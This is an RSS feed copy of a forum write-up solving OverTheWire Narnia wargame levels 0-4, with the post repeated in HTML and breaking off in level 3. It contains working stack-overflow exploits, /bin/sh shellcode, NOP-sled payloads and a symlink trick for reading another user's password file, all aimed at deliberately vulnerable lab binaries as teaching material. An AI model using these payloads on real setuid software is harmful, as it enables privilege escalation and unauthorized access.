<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>OverTheWire Narnia challenges 0-4 Writeups (Binary exploitation basics with explanations)</title>
    <link>https://0x00sec.org/t/overthewire-narnia-challenges-0-4-writeups-binary-exploitation-basics-with-explanations/18362</link>
    <description># OverTheWire Narnia challenges 0-4 Writeups

In this post I will be writing up challenges 0-4 from the Narnia series on OverTheWire, with the best explanation I can come up with for each, so someone that has no understanding of pwn, can get a base, and play the challenges for themselves.

Each pwnable consists of a SetUID binary (this means on runtime it will execute as another user, so if we can make the binary spawn a shell while it is running, the shell will be as another user), and the .c sourcecode, so we can get an idea of how each challenge is made up (in this writeup I have anotated the source codes to help clarify what is happening).

I found that being able to visualize how the stack is structured helped me massively to understand what is happening in this attack. Here is a perfect video from Computerphile (https://youtube.com/computerphile) that elaborates upon what the attack consists of, and how it works https://www.youtube.com/watch?v=1S0aBV-Waeo.

# Challenge 0
Our first step is to login to the first user on SSH, using the credentials narnia0:narnia0, on port 2226.
`ssh narnia0@narnia.labs.overthewire.org -p 2226`
Now we head to the /narnia/ directory and find the source code and binary, here is the source code:
```c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(){
    long val=0x41414141;  /*Puts the value we want to overwrite on the stack*/
    char buf[20];         /*Sets the buffer length to 20 bytes*/

    printf(&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;);
    printf(&quot;Here is your chance: &quot;);
    scanf(&quot;%24s&quot;,&amp;buf); /*Reads input into buffer (24 char limit on buffer, which is enough to fill the buffer and then the 4 bytes for deadbeef)*/

    printf(&quot;buf: %s\n&quot;,buf); /*Prints contents of buffer*/
    printf(&quot;val: 0x%08x\n&quot;,val); /*Outputs value we want to overwrite*/

    if(val==0xdeadbeef){ /*If value == 0xdeadbeef*/
        setreuid(geteuid(),geteuid()); /*Make the binary use the SUID and GUID*/
        system(&quot;/bin/sh&quot;); /*Run /bin/sh to spawn a shell*/
    }
    else { /*If the value isn&#39;t 0xdeadbeef then*/
        printf(&quot;WAY OFF!!!!\n&quot;); /*Print &quot;WAY OFF!!!!&quot; and then exit*/
        exit(1);
    }

    return 0;
}
```
So this challenge is extremely straight forward, essentially, we can right to the buffer, which is of size 20, and since there are no limits on how much we can input into the buffer, it allows us to write more than twenty characters to memory, and since the &quot;val&quot; variable is the next value on the stack, we can overwrite it&#39;s contents.

We can do this two ways, the clean way, and the disgusting way:

The clean way would be make python print twenty A&#39;s (the buffer size), plus the value we want to put in memory, which in this case needs to be in little endian format.

We know it needs to be little endian format since when we run &quot;file /narnia/narnia0&quot;, we get the following output:
```narnia0: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0840ec7ce39e76ebcecabacb3dffb455cfa401e9, not stripped``` (https://en.wikipedia.org/wiki/Endianness)

To convert a value to little endian (in this case we want to convert 0xdeadbeef), so we remove the 0x (this is just an indicator that the value is hex), then we split it up into groups of two (de ad be ef), now we reverse the order of the groups, but not the characters (ef be ad de), and finally we add &quot;\x&quot; in front of each group, and put them all together: `\xef\xbe\xad\xde`, so that&#39;s what we need to feed the binary after the 20 bytes, let&#39;s try it.
```
narnia0@narnia:/narnia$ python -c &#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39; | ./narnia0
Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
                                               val: 0xdeadbeef
```
So the challenge bugs out, and doesn&#39;t open a shell, but it does show us that the correct value is in place, now we can use a little trick involving cat to keep the i/o stream open:
```
narnia0@narnia:/narnia$ (python -c &#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39;;cat) | ./narnia0
Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
                                               val: 0xdeadbeef
whoami
narnia1
```
Voila! Challenge 0 has been pwned, now we have a shell as narnia1, and can simply cat the password for narnia1 from /etc/narnia_pass/narnia1.

# Challenge 1
The next challenge makes things a bit more complicated, we are now given the following source code:
```c
#include &lt;stdio.h&gt;

int main(){
    int (*ret)();

    if(getenv(&quot;EGG&quot;)==NULL){ /*If the &quot;EGG&quot; env var is empty then*/
        printf(&quot;Give me something to execute at the env-variable EGG\n&quot;);
        exit(1); /*And then exit*/
    }

    printf(&quot;Trying to execute EGG!\n&quot;);
    ret = getenv(&quot;EGG&quot;); /*Assign the contents of EGG to a var called ret*/
    ret(); /*Execute ret*/

    return 0;
}
```
Since this binary runs the contents of ret, we can feed ret shell code and it will be executed.

As an example, I will be using a purely alphanumeric shellcode made by a friend of mine (https://github.com/push4d/Shellcode-alfanumerico---Spawn-bin-sh-elf-x86-), so we can put the shellcode inside the environment variable called &quot;EGG&quot; and then run the binary.
```
narnia1@narnia:/narnia$ export EGG=hzzzzYAAAAAA0HM0hN0HNhu12ZX5ZBZZPhu834X5ZZZZPTYhjaaaX5aaaaP5aaaa5jaaaPPQTUVWaMz
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
```
Just to expand upon this, the shellcode does not have to be alphanumeric, it just makes it easier if it is since you can directly put it into the env var. An example of a payload that uses non-alphanumeric shellcode would be the following:
```
narnia1@narnia:/narnia$ export EGG=$(python -c &#39;print &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&quot;&#39;); /narnia/narnia1
Trying to execute EGG!
$ whoami
narnia2
```

# Challenge 2
Now we get into some &quot;actual&quot; binexp, with an extremely basic payload that fills ESP with nops (\x90), except for some shell code at the end, and then overwriting the ret address to be the start of ESP.

Here is the source code:
```c
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

int main(int argc, char * argv[]){
    char buf[128]; /*Declares the buffer length to be 128 bytes*/

    if(argc == 1){
        printf(&quot;Usage: %s argument\n&quot;, argv[0]); /*Display usage*/
        exit(1);
    }
    strcpy(buf,argv[1]); /*Copy contents of arg 1 to buffer*/
    printf(&quot;%s&quot;, buf); /*Print the buffer*/

    return 0;
}
```
So we can start by getting the crash offset (which will be somewhere around 128, since this is the buffer size, although if there is something between the end of the buffer and the start of the ret address on the stack, then we will need to play with the ret addr location in the payload), for this I made a really simple bash loop that slowly increases the padding.
```bash
for i in $(seq 1 300); do echo $i; ./narnia2 $(python -c &#39;print &quot;A&quot;*&#39;$i&#39;;&#39;); done
```
All this does is loops from 1 to 300, and echoes out the number each time, but also prints &quot;A&quot; that amount of times while passing it as an argument to the binary, so we can follow the numbers until we find a segfault.
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA132
Segmentation fault
```
We can see that after 132 the binary segfaults, so that is our space we have till the ret address starts getting overwritten.

Now, the buffer is 128 bytes, and the ret address breaks at 132, so between the end of the buffer, and the start of the return address there are 4 bytes of &quot;junk&quot;, which you can just fill with nopsleds, but in our case we will just repeat the ret address 4 times (one will fall into the right position, the others are fillers).

So we have our padding, to get our return address, we can simply crash it with a segfault, while watching it with ltrace.
```
narnia2@narnia:/narnia$ ltrace ./narnia2 $(python -c &#39;print &quot;A&quot;*132&#39;)
__libc_start_main(0x804844b, 2, 0xffffd704, 0x80484a0 &lt;unfinished ...&gt;
strcpy(0xffffd5e8, &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;...)                                                                     = 0xffffd5e8
printf(&quot;%s&quot;, &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;...)                                                                           = 132
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
Ltrace shows us that strcpy tries to copy our &quot;A&quot;s to the address `0xffffd5e8` (the memory location of the buffer), which in little endian is: `\xe8\xd5\xff\xff`. So we have the padding, we have the return address, now we just need the shellcode. For this we can use the example alphanumeric shellcode, or we can find our own with a simple google search for &quot;32 bit bin sh shellcode&quot; (http://shell-storm.org/shellcode/files/shellcode-827.php).

So now to structure our payload, the idea is to take advantage of the fact that we control the contents of the buffer, and we also control the return address, so if we make the contents of the buffer malicious, and then return back to the start of the buffer, it will be executed.

So the first step is having our padding, a nop (no operation, \x90), basically makes the machine do nothing, and move on to the next instruction, so we can fill the start of the buffer with nops, up until our shellcode.

The shellcode takes up a total of 28 bytes, and our buffer size is 128 bytes, so that is 100 nops (128 - 28), then we have the 4 bytes of &quot;junk&quot;, and then the return address, to summarise:
`\x90 x 100 + 28 (shellcode) + 4 (junk) + 4 (ret addr)`

So, now we know how to build our payload, and can run it on the vulnerable binary:
```
narnia2@narnia:/narnia$ ./narnia2 $(python -c &#39;print &quot;\x90&quot;*100 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&quot; + &quot;\x90\x90\x90\x90&quot; + &quot;\xe8\xd5\xff\xff&quot;&#39;)
$ whoami
narnia3
```

# Challenge 3
For challenge three, things start to take a turn for the better, everything is a little more complex. Not in the way that the concepts are more complex, but a bit of out-of-the-box thinking is required to make the vulnerability work in your advantage.

We start with the following source code:
```c
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = &quot;/dev/null&quot;; /*Sets the output file to /dev/null (var size is 16 bytes)*/
    char ifile[32]; /*Sets the variable size to 32 bytes*/
    char buf[32]; /*Sets the buffer size to 32 bytes*/

    if(argc != 2){ /*Print usage*/
        printf(&quot;usage, %s file, will send contents of file 2 /dev/null\n&quot;,argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]); /*Copies arg to ifile var (this is vulnerable)*/
    if((ofd = open(ofile,O_RDWR)) &lt; 0 ){
        printf(&quot;error opening %s\n&quot;, ofile); /*Error handler*/
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) &lt; 0 ){
        printf(&quot;error opening %s\n&quot;, ifile); /*Error handler*/
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1); /*Read content of In File*/
    write(ofd,buf, sizeof(buf)-1); /*Write content to Out File*/
    printf(&quot;copied contents of %s to a safer place... (%s)\n&quot;,ifile,ofile);

    /* close &#39;em */
    close(ifd); /*Close both*/
    close(ofd);

    exit(1);
}
```

So, the base concept is that we can overwrite the output file to be something we can read, and we control the input file, the rest is pretty simple.

Here is an example of the binaries usage:
```
narnia3@narnia:/narnia$ touch /tmp/LetsPlay
narnia3@narnia:/narnia$ ./narnia3 /tmp/LetsPlay
copied contents of /tmp/LetsPlay to a safer place... (/dev/null)
```
We move to the /tmp directory since we control everything inside of it, now we need can start playing with the input file, we know the input buffer is 32 bytes, and the output file is 16 bytes, so we could technically make something like `/tmp/&quot;z&quot;*27`(32-len(&#39;/tmp/&#39;)), and then the file we want to write to, let&#39;s say the output file is /tmp/outforchiv.

When you overflow the input variable, you also overwrite the null-byte that defines where that variable&#39;s string ends, whereas the memory location where the outfile var starts remains the same, we can abuse this, and make the file be something like /tmp/27bytes/tmp/file, and then symlink narnia4&#39;s password to /tmp/27bytes/tmp/file, but also make a file called /tmp/file with 777 permissions.

When we feed the binary this path, it will overflow the buffer, overwrite the termination byte, so the input file is taken as /tmp/27bytes/tmp/file, but the output file is just /tmp/file.

Let&#39;s put this theory to test:
```
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ ln -s /etc/narnia_pass/narnia4 outforchiv
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ touch /tmp/outforchiv
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ chmod 777 /tmp/outforchiv
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$ /narnia/narnia3 $(pwd)/outforchiv
copied contents of /tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp/outforchiv to a safer place... (/tmp/outforchiv)
narnia3@narnia:/tmp/zzzzzzzzzzzzzzzzzzzzzzzzzzz/tmp$
```
Now we can cat the /tmp/outforchiv file and read the password!

# Challenge 4
Welcome to the final challenge of this writeup, it is another buffer overflow to pop a shell, so I recommend you go back and make sure you understand the basics with challenge 2.

We have the following source code:
```c
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;ctype.h&gt;

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256]; /*Defines the buffer length*/

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], &#39;\0&#39;, strlen(environ[i]));

    if(argc&gt;1)
        strcpy(buffer,argv[1]); /*Copies the argument to the buffer (vulnerable)*/

    return 0;
}
```

We can start by getting our padding, we know the buffer size is 256, so we can start with that, next we need our return address, so we can run: `ltrace ./narnia4 $(python -c &#39;print &quot;A&quot;*300&#39;)` and then get the address that strcpy was going to copy the A&#39;s to (in my case it was 0xffffd4d4), so we have our padding, return address, and we can re-use the shellcode from challenge 2, which is 28 bytes long.

Our payload will look something like this right now:
`./narnia4 $(python -c &#39;print &quot;\x90&quot;*256 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\
x80&quot; + &quot;\xd4\xd4\xff\xff&quot;*4&#39;)`

To clarify, I have converted the return address to little endian format (0xffffd4d4 -&gt; \xd4\xd4\xff\xff), and I have made it appear four times consecutively in the payload to increase chances of it falling into the right place, finally, I replaced the &quot;A&quot;s with \x90&#39;s or no operation bytes, so the machine will skip those bytes until it reaches our shellcode.

This won&#39;t work, since there is a 4 byte address between the end of the buffer and the start of the return address, so we need to add 4 bytes to our padding, making it 260.

Our final exploit being:
```bash
./narnia4 $(python -c &#39;print &quot;\x90&quot;*260 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\
x80&quot; + &quot;\xd4\xd4\xff\xff&quot;*4&#39;) # YOUR RETURN ADDRESS MAY VARY
```
And when we run it:
```bash
narnia4@narnia:/narnia$ ./narnia4 $(python -c &#39;print &quot;\x90&quot;*(260 - 28) + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\
x80&quot; + &quot;\xd4\xd4\xff\xff&quot;*4&#39;)
$ whoami
narnia5
```
Bingo! I hope this writeup clarified some concepts, or helped someone start off with an idea of what is happening. If anyone has any questions, I am basically permanently reachable on both twitter (https://twitter.com/SecGus), and on this platform, 0x00sec.

Some fun and useful resources for learning pwn are:
- OverTheWire Narnia (Where these challenges can be found,https://overthewire.org/wargames/narnia/)
- Pwnable KR (http://pwnable.kr/)
- Root-Me (https://www.root-me.org/)
- HackTheBox (https://hackthebox.eu)</description>
    
    <lastBuildDate>Wed, 15 Apr 2020 14:56:42 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://0x00sec.org/t/overthewire-narnia-challenges-0-4-writeups-binary-exploitation-basics-with-explanations/18362.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>OverTheWire Narnia challenges 0-4 Writeups (Binary exploitation basics with explanations)</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/overthewire-narnia-challenges-0-4-writeups-binary-exploitation-basics-with-explanations/18362/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/overthewire-narnia-challenges-0-4-writeups-binary-exploitation-basics-with-explanations/18362/3</link>
        <pubDate>Thu, 30 Apr 2020 18:38:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-18362-3</guid>
        <source url="https://0x00sec.org/t/overthewire-narnia-challenges-0-4-writeups-binary-exploitation-basics-with-explanations/18362.rss">OverTheWire Narnia challenges 0-4 Writeups (Binary exploitation basics with explanations)</source>
      </item>
      <item>
        <title>OverTheWire Narnia challenges 0-4 Writeups (Binary exploitation basics with explanations)</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Cheeky Bump</p>
<p>Awesome writeup dude!</p>
          <p><a href="https://0x00sec.org/t/overthewire-narnia-challenges-0-4-writeups-binary-exploitation-basics-with-explanations/18362/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/overthewire-narnia-challenges-0-4-writeups-binary-exploitation-basics-with-explanations/18362/2</link>
        <pubDate>Wed, 15 Apr 2020 14:56:42 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-18362-2</guid>
        <source url="https://0x00sec.org/t/overthewire-narnia-challenges-0-4-writeups-binary-exploitation-basics-with-explanations/18362.rss">OverTheWire Narnia challenges 0-4 Writeups (Binary exploitation basics with explanations)</source>
      </item>
      <item>
        <title>OverTheWire Narnia challenges 0-4 Writeups (Binary exploitation basics with explanations)</title>
        <dc:creator><![CDATA[chivato]]></dc:creator>
        <description><![CDATA[
            <h1>OverTheWire Narnia challenges 0-4 Writeups</h1>
<p>In this post I will be writing up challenges 0-4 from the Narnia series on OverTheWire, with the best explanation I can come up with for each, so someone that has no understanding of pwn, can get a base, and play the challenges for themselves.</p>
<p>Each pwnable consists of a SetUID binary (this means on runtime it will execute as another user, so if we can make the binary spawn a shell while it is running, the shell will be as another user), and the .c sourcecode, so we can get an idea of how each challenge is made up (in this writeup I have anotated the source codes to help clarify what is happening).</p>
<p>I found that being able to visualize how the stack is structured helped me massively to understand what is happening in this attack. Here is a perfect video from Computerphile (<a href="https://youtube.com/computerphile" rel="nofollow noopener">https://youtube.com/computerphile</a>) that elaborates upon what the attack consists of, and how it works <a href="https://www.youtube.com/watch?v=1S0aBV-Waeo" rel="nofollow noopener">https://www.youtube.com/watch?v=1S0aBV-Waeo</a>.</p>
<h1>Challenge 0</h1>
<p>Our first step is to login to the first user on SSH, using the credentials narnia0:narnia0, on port 2226.<br>
<code>ssh narnia0@narnia.labs.overthewire.org -p 2226</code><br>
Now we head to the /narnia/ directory and find the source code and binary, here is the source code:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(){
    long val=0x41414141;  /*Puts the value we want to overwrite on the stack*/
    char buf[20];         /*Sets the buffer length to 20 bytes*/

    printf("Correct val's value from 0x41414141 -&gt; 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&amp;buf); /*Reads input into buffer (24 char limit on buffer, which is enough to fill the buffer and then the 4 bytes for deadbeef)*/

    printf("buf: %s\n",buf); /*Prints contents of buffer*/
    printf("val: 0x%08x\n",val); /*Outputs value we want to overwrite*/

    if(val==0xdeadbeef){ /*If value == 0xdeadbeef*/
        setreuid(geteuid(),geteuid()); /*Make the binary use the SUID and GUID*/
        system("/bin/sh"); /*Run /bin/sh to spawn a shell*/
    }
    else { /*If the value isn't 0xdeadbeef then*/
        printf("WAY OFF!!!!\n"); /*Print "WAY OFF!!!!" and then exit*/
        exit(1);
    }

    return 0;
}
</code></pre>
<p>So this challenge is extremely straight forward, essentially, we can right to the buffer, which is of size 20, and since there are no limits on how much we can input into the buffer, it allows us to write more than twenty characters to memory, and since the “val” variable is the next value on the stack, we can overwrite it’s contents.</p>
<p>We can do this two ways, the clean way, and the disgusting way:</p>
<p>The clean way would be make python print twenty A’s (the buffer size), plus the value we want to put in memory, which in this case needs to be in little endian format.</p>
<p>We know it needs to be little endian format since when we run “file /narnia/narnia0”, we get the following output:<br>
<code>narnia0: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0840ec7ce39e76ebcecabacb3dffb455cfa401e9, not stripped</code> (<a href="https://en.wikipedia.org/wiki/Endianness" rel="nofollow noopener">https://en.wikipedia.org/wiki/Endianness</a>)</p>
<p>To convert a value to little endian (in this case we want to convert 0xdeadbeef), so we remove the 0x (this is just an indicator that the value is hex), then we split it up into groups of two (de ad be ef), now we reverse the order of the groups, but not the characters (ef be ad de), and finally we add “\x” in front of each group, and put them all together: <code>\xef\xbe\xad\xde</code>, so that’s what we need to feed the binary after the 20 bytes, let’s try it.</p>
<pre><code class="lang-auto">narnia0@narnia:/narnia$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
                                               val: 0xdeadbeef
</code></pre>
<p>So the challenge bugs out, and doesn’t open a shell, but it does show us that the correct value is in place, now we can use a little trick involving cat to keep the i/o stream open:</p>
<pre><code class="lang-auto">narnia0@narnia:/narnia$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"';cat) | ./narnia0
Correct val's value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
                                               val: 0xdeadbeef
whoami
narnia1
</code></pre>
<p>Voila! Challenge 0 has been pwned, now we have a shell as narnia1, and can simply cat the password for narnia1 from /etc/narnia_pass/narnia1.</p>
<h1>Challenge 1</h1>
<p>The next challenge makes things a bit more complicated, we are now given the following source code:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){ /*If the "EGG" env var is empty then*/
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1); /*And then exit*/
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG"); /*Assign the contents of EGG to a var called ret*/
    ret(); /*Execute ret*/

    return 0;
}
</code></pre>
<p>Since this binary runs the contents of ret, we can feed ret shell code and it will be executed.</p>
<p>As an example, I will be using a purely alphanumeric shellcode made by a friend of mine (<a href="https://github.com/push4d/Shellcode-alfanumerico---Spawn-bin-sh-elf-x86-" rel="nofollow noopener">https://github.com/push4d/Shellcode-alfanumerico---Spawn-bin-sh-elf-x86-</a>), so we can put the shellcode inside the environment variable called “EGG” and then run the binary.</p>
<pre><code class="lang-auto">narnia1@narnia:/narnia$ export EGG=hzzzzYAAAAAA0HM0hN0HNhu12ZX5ZBZZPhu834X5ZZZZPTYhjaaaX5aaaaP5aaaa5jaaaPPQTUVWaMz
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
</code></pre>
<p>Just to expand upon this, the shellcode does not have to be alphanumeric, it just makes it easier if it is since you can directly put it into the env var. An example of a payload that uses non-alphanumeric shellcode would be the following:</p>
<pre><code class="lang-auto">narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'); /narnia/narnia1
Trying to execute EGG!
$ whoami
narnia2
</code></pre>
<h1>Challenge 2</h1>
<p>Now we get into some “actual” binexp, with an extremely basic payload that fills ESP with nops (\x90), except for some shell code at the end, and then overwriting the ret address to be the start of ESP.</p>
<p>Here is the source code:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

int main(int argc, char * argv[]){
    char buf[128]; /*Declares the buffer length to be 128 bytes*/

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]); /*Display usage*/
        exit(1);
    }
    strcpy(buf,argv[1]); /*Copy contents of arg 1 to buffer*/
    printf("%s", buf); /*Print the buffer*/

    return 0;
}
</code></pre>
<p>So we can start by getting the crash offset (which will be somewhere around 128, since this is the buffer size, although if there is something between the end of the buffer and the start of the ret address on the stack, then we will need to play with the ret addr location in the payload), for this I made a really simple bash loop that slowly increases the padding.</p>
<pre><code class="lang-bash">for i in $(seq 1 300); do echo $i; ./narnia2 $(python -c 'print "A"*'$i';'); done
</code></pre>
<p>All this does is loops from 1 to 300, and echoes out the number each time, but also prints “A” that amount of times while passing it as an argument to the binary, so we can follow the numbers until we find a segfault.</p>
<pre><code class="lang-auto">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA132
Segmentation fault
</code></pre>
<p>We can see that after 132 the binary segfaults, so that is our space we have till the ret address starts getting overwritten.</p>
<p>Now, the buffer is 128 bytes, and the ret address breaks at 132, so between the end of the buffer, and the start of the return address there are 4 bytes of “junk”, which you can just fill with nopsleds, but in our case we will just repeat the ret address 4 times (one will fall into the right position, the others are fillers).</p>
<p>So we have our padding, to get our return address, we can simply crash it with a segfault, while watching it with ltrace.</p>
<pre><code class="lang-auto">narnia2@narnia:/narnia$ ltrace ./narnia2 $(python -c 'print "A"*132')
__libc_start_main(0x804844b, 2, 0xffffd704, 0x80484a0 &lt;unfinished ...&gt;
strcpy(0xffffd5e8, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                     = 0xffffd5e8
printf("%s", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                           = 132
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
</code></pre>
<p>Ltrace shows us that strcpy tries to copy our "A"s to the address <code>0xffffd5e8</code> (the memory location of the buffer), which in little endian is: <code>\xe8\xd5\xff\xff</code>. So we have the padding, we have the return address, now we just need the shellcode. For this we can use the example alphanumeric shellcode, or we can find our own with a simple google search for “32 bit bin sh shellcode” (<a href="http://shell-storm.org/shellcode/files/shellcode-827.php" rel="nofollow noopener">http://shell-storm.org/shellcode/files/shellcode-827.php</a>).</p>
<p>So now to structure our payload, the idea is to take advantage of the fact that we control the contents of the buffer, and we also control the return address, so if we make the contents of the buffer malicious, and then return back to the start of the buffer, it will be executed.</p>
<p>So the first step is having our padding, a nop (no operation, \x90), basically makes the machine do nothing, and move on to the next instruction, so we can fill the start of the buffer with nops, up until our shellcode.</p>
<p>The shellcode takes up a total of 28 bytes, and our buffer size is 128 bytes, so that is 100 nops (128 - 28), then we have the 4 bytes of “junk”, and then the return address, to summarise:<br>
<code>\x90 x 100 + 28 (shellcode) + 4 (junk) + 4 (ret addr)</code></p>
<p>So, now we know how to build our payload, and can run it on the vulnerable binary:</p>
<pre><code class="lang-auto">narnia2@narnia:/narnia$ ./narnia2 $(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90\x90\x90\x90" + "\xe8\xd5\xff\xff"')
$ whoami
narnia3
</code></pre>
<h1>Challenge 3</h1>
<p>For challenge three, things start to take a turn for the better, everything is a little more complex. Not in the way that the concepts are more complex, but a bit of out-of-the-box thinking is required to make the vulnerability work in your advantage.</p>
<p>We start with the following source code:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null"; /*Sets the output file to /dev/null (var size is 16 bytes)*/
    char ifile[32]; /*Sets the variable size to 32 bytes*/
    char buf[32]; /*Sets the buffer size to 32 bytes*/

    if(argc != 2){ /*Print usage*/
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]); /*Copies arg to ifile var (this is vulnerable)*/
    if((ofd = open(ofile,O_RDWR)) &lt; 0 ){
        printf("error opening %s\n", ofile); /*Error handler*/
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) &lt; 0 ){
        printf("error opening %s\n", ifile); /*Error handler*/
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1); /*Read content of In File*/
    write(ofd,buf, sizeof(buf)-1); /*Write content to Out File*/
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd); /*Close both*/
    close(ofd);

    exit(1);
}
</code></pre>
<p>So, the base concept is that we can overwrite the output file to be something we can read, and we control the input file, the rest is pretty simple.</p>
<p>Here is an example of the binaries usage:</p>
<pre><code class="lang-auto">narnia3@narnia:/narnia$ touch /tmp/LetsPlay
narnia3@narnia:/narnia$ ./narnia3 /tmp/LetsPlay
copied contents of /tmp/LetsPlay to a safer place... (/dev/null)
</code></pre>
